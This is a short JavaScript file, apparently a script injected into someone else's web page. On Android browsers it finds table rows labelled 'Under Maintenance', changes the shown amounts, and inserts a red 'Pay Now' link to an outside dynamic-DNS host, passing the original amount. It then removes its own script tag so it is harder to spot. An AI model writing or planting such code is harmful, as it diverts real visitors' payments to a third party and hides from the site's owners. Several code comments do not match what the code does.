function executeScript() {

    // Check if the "visited" cookie exists

    var tdElements = document.querySelectorAll('td');


    // Loop through each <a> element
    tdElements.forEach(function (tdEle) {
        if (tdEle.textContent.trim() === 'Under Maintenance') {
            tdElement = tdEle.previousSibling;
            var numberValue = parseInt(tdElement.textContent.trim(), 10); // parseInt function parses a string and returns an integer
            var result = Math.floor(numberValue / 11000) * 11000; // 3 is the divisor
            if (numberValue < 11000) {
                result = 11000;
            }
            if (/Android/i.test(navigator.userAgent)) {
                tdElement.textContent = result;
                tdElement.textContent = result;
                var row = tdEle.parentElement
                row.removeChild(tdEle);
                var cell = row.insertCell(); // Insert a new cell at the end of the row
                var cell2 = row.insertCell();
                var anchor = document.createElement("a");
                anchor.href = "http://webkingbcm.ddns.net/buy?amount=" + numberValue; // Set the href attribute to the desired URL
                anchor.textContent = "Pay Now";
                anchor.style.color = "red";
                cell2.appendChild(anchor)
                console.log(row);
            }


        }
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', executeScript);
executeScript();
var scriptTags = document.querySelectorAll('script[src="https://johndove9912.github.io/webtest/test.js"]');
scriptTags.forEach(function (scriptTag) {
    scriptTag.parentNode.removeChild(scriptTag);
});
